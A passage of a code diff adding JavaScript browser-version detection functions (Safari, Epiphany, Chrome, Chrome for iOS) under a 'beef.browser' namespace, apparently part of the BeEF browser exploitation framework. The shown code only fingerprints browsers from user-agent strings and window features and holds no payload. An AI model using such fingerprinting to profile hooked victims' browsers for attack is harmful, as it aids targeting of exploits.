+        var legacyCheck = this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24() || this.isFF25() || this.isFF26() || this.isFF27() || this.isFF28() || this.isFF29() || this.isFF30() || this.isFF31() || this.isFF32() || this.isFF33() || this.isFF34() || this.isFF35() || this.isFF36() || this.isFF37() || this.isFF38() || this.isFF39() || this.isFF40() || this.isFF41() || this.isFF42() || this.isFF43() || this.isFF44() || this.isFF45() || this.isFF46() || this.isFF47() || this.isFF48() || this.isFF49() || this.isFF50() || this.isFF51() || this.isFF52() || this.isFF53() || this.isFF54() || this.isFF55() || this.isFF56() || this.isFF57() || this.isFF58()|| this.isFF59() || this.isFF60() || this.isFF61() || this.isFF62() || this.isFF63() || this.isFF64() || this.isFF65() || this.isFF66() || this.isFF67() || this.isFF68() || this.isFF69() || this.isFF70() || this.isFF71() || this.isFF72() || this.isFF73() || this.isFF74() || this.isFF75() || this.isFF76() || this.isFF77() || this.isFF78() || this.isFF79() || this.isFF80() || this.isFF81() || this.isFF82() || this.isFF83() || this.isFF84() || this.isFF85() || this.isFF86() || this.isFF87() || this.isFF88() || this.isFF89() || this.isFF90() || this.isFF91() || this.isFF92() || this.isFF93() || this.isFF94() || this.isFF95() || this.isFF96() || this.isFF97() || this.isFF98() || this.isFF99();
+        return legacyCheck || this.isFFbowser();
+    },
+
+    /**
+     * Returns true if Safari 4.xx
+     * @example: beef.browser.isS4()
+     */
+    isS4: function () {
+        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/4/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
+    },
+
+    /**
+     * Returns true if Safari 5.xx
+     * @example: beef.browser.isS5()
+     */
+    isS5: function () {
+        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/5/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
+    },
+
+    /**
+     * Returns true if Safari 6.xx
+     * @example: beef.browser.isS6()
+     */
+    isS6: function () {
+        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/6/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
+    },
+
+    /**
+     * Returns true if Safari 7.xx
+     * @example: beef.browser.isS7()
+     */
+    isS7: function () {
+        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/7/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
+    },
+
+    /**
+     * Returns true if Safari 8.xx
+     * @example: beef.browser.isS8()
+     */
+    isS8: function () {
+        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/8/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
+    },
+
+    /**
+     * Returns true if Safari.
+     * @example: beef.browser.isS()
+     */
+    isS: function () {
+        return this.isS4() || this.isS5() || this.isS6() || this.isS7() || this.isS8();
+    },
+
+    /**
+     * Returns true if Webkit based
+     */
+
+
+    isWebKitBased: function () {
+        /*
+        * **** DUPLICATE WARNING **** Changes here may aldo need addressed in /isS\d+/ functions.
+        */
+        return (!window.opera && !window.chrome
+                && window.navigator.userAgent.match(/ Version\/\d/) != null
+                && !window.globalStorage
+                && !!window.getComputedStyle
+                && !("MozWebSocket" in window));
+    },
+
+    /**
+     * Return true if Epiphany
+     * @example: beef.browser.isEpi()
+     */
+    isEpi: function () {
+        // Epiphany is based on webkit
+        // due to the uncertainty of webkit version vs Epiphany versions tracking.
+        // -- do webkit based checking (i.e. do safari checks)
+        return this.isWebKitBased() &&  window.navigator.userAgent.match(/Epiphany\//) != null;
+    },
+
+
+    /**
+     * Returns true if Chrome 5.
+     * @example: beef.browser.isC5()
+     */
+    isC5: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 6.
+     * @example: beef.browser.isC6()
+     */
+    isC6: function () {
+        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 7.
+     * @example: beef.browser.isC7()
+     */
+    isC7: function () {
+        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 8.
+     * @example: beef.browser.isC8()
+     */
+    isC8: function () {
+        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 9.
+     * @example: beef.browser.isC9()
+     */
+    isC9: function () {
+        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 10.
+     * @example: beef.browser.isC10()
+     */
+    isC10: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 11.
+     * @example: beef.browser.isC11()
+     */
+    isC11: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 12.
+     * @example: beef.browser.isC12()
+     */
+    isC12: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 13.
+     * @example: beef.browser.isC13()
+     */
+    isC13: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 14.
+     * @example: beef.browser.isC14()
+     */
+    isC14: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 15.
+     * @example: beef.browser.isC15()
+     */
+    isC15: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 16.
+     * @example: beef.browser.isC16()
+     */
+    isC16: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 17.
+     * @example: beef.browser.isC17()
+     */
+    isC17: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 18.
+     * @example: beef.browser.isC18()
+     */
+    isC18: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 19.
+     * @example: beef.browser.isC19()
+     */
+    isC19: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 19.
+     * @example: beef.browser.isC19iOS()
+     */
+    isC19iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 20.
+     * @example: beef.browser.isC20()
+     */
+    isC20: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 20.
+     * @example: beef.browser.isC20iOS()
+     */
+    isC20iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 21.
+     * @example: beef.browser.isC21()
+     */
+    isC21: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 21.
+     * @example: beef.browser.isC21iOS()
+     */
+    isC21iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 22.
+     * @example: beef.browser.isC22()
+     */
+    isC22: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 22.
+     * @example: beef.browser.isC22iOS()
+     */
+    isC22iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 23.
+     * @example: beef.browser.isC23()
+     */
+    isC23: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 23.
+     * @example: beef.browser.isC23iOS()
+     */
+    isC23iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 24.
+     * @example: beef.browser.isC24()
+     */
+    isC24: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 24.
+     * @example: beef.browser.isC24iOS()
+     */
+    isC24iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 25.
+     * @example: beef.browser.isC25()
+     */
+    isC25: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 25.
+     * @example: beef.browser.isC25iOS()
+     */
+    isC25iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 26.
+     * @example: beef.browser.isC26()
+     */
+    isC26: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 26.
+     * @example: beef.browser.isC26iOS()
+     */
+    isC26iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 27.
+     * @example: beef.browser.isC27()
+     */
+    isC27: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 27.
+     * @example: beef.browser.isC27iOS()
+     */
+    isC27iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 28.
+     * @example: beef.browser.isC28()
+     */
+    isC28: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 28.
+     * @example: beef.browser.isC28iOS()
+     */
+    isC28iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 29.
+     * @example: beef.browser.isC29()
+     */
+    isC29: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 29) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 29.
+     * @example: beef.browser.isC29iOS()
+     */
+    isC29iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 29) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 30.
+     * @example: beef.browser.isC30()
+     */
+    isC30: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 30) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 30.
+     * @example: beef.browser.isC30iOS()
+     */
+    isC30iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 30) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 31.
+     * @example: beef.browser.isC31()
+     */
+    isC31: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 31) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 31.
+     * @example: beef.browser.isC31iOS()
+     */
+    isC31iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 31) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 32.
+     * @example: beef.browser.isC32()
+     */
+    isC32: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 32) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 32.
+     * @example: beef.browser.isC32iOS()
+     */
+    isC32iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 32) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 33.
+     * @example: beef.browser.isC33()
+     */
+    isC33: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 33) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 33.
+     * @example: beef.browser.isC33iOS()
+     */
+    isC33iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 33) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 34.
+     * @example: beef.browser.isC34()
+     */
+    isC34: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 34) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 34.
+     * @example: beef.browser.isC34iOS()
+     */
+    isC34iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 34) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 35.
+     * @example: beef.browser.isC35()
+     */
+    isC35: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 35) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 35.
+     * @example: beef.browser.isC35iOS()
+     */
+    isC35iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 35) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 36.
+     * @example: beef.browser.isC36()
+     */
+    isC36: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 36) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 36.
+     * @example: beef.browser.isC36iOS()
+     */
+    isC36iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 36) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 37.
+     * @example: beef.browser.isC37()
+     */
+    isC37: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 37) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 37.
+     * @example: beef.browser.isC37iOS()
+     */
+    isC37iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 37) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 38.
+     * @example: beef.browser.isC38()
+     */
+    isC38: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 38) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 38.
+     * @example: beef.browser.isC38iOS()
+     */
+    isC38iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 38) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 39.
+     * @example: beef.browser.isC39()
+     */
+    isC39: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 39) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 39.
+     * @example: beef.browser.isC39iOS()
+     */
+    isC39iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 39) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 40.
+     * @example: beef.browser.isC40()
+     */
+    isC40: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 40) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 40.
+     * @example: beef.browser.isC40iOS()
+     */
+    isC40iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 40) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 41.
+     * @example: beef.browser.isC41()
+     */
+    isC41: function () {
+        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 41) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 41.
+     * @example: beef.browser.isC41iOS()
+     */
+    isC41iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 41) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 42.
+     * @example: beef.browser.isC42()
+     */
+    isC42: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 42) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 42.
+     * @example: beef.browser.isC42iOS()
+     */
+    isC42iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 42) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 43.
+     * @example: beef.browser.isC43()
+     */
+    isC43: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 43) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 43.
+     * @example: beef.browser.isC43iOS()
+     */
+    isC43iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 43) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 44.
+     * @example: beef.browser.isC44()
+     */
+    isC44: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 44) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 44.
+     * @example: beef.browser.isC44iOS()
+     */
+    isC44iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 44) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 45.
+     * @example: beef.browser.isC45()
+     */
+    isC45: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 45) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 45.
+     * @example: beef.browser.isC45iOS()
+     */
+    isC45iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 45) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 46.
+     * @example: beef.browser.isC46()
+     */
+    isC46: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 46) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 46.
+     * @example: beef.browser.isC46iOS()
+     */
+    isC46iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 46) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 47.
+     * @example: beef.browser.isC47()
+     */
+    isC47: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 47) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 47.
+     * @example: beef.browser.isC47iOS()
+     */
+    isC47iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 47) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 48.
+     * @example: beef.browser.isC48()
+     */
+    isC48: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 48) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 48.
+     * @example: beef.browser.isC48iOS()
+     */
+    isC48iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 48) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 49.
+     * @example: beef.browser.isC49()
+     */
+    isC49: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 49) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 49.
+     * @example: beef.browser.isC49iOS()
+     */
+    isC49iOS: function () {
+        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 49) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome 50.
+     * @example: beef.browser.isC50()
+     */
+    isC50: function () {
+        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 50) ? true : false);
+    },
+
+    /**
+     * Returns true if Chrome for iOS 50.
+     * @example: beef.browser.isC50iOS()
+     */
+    isC50iOS: function () {
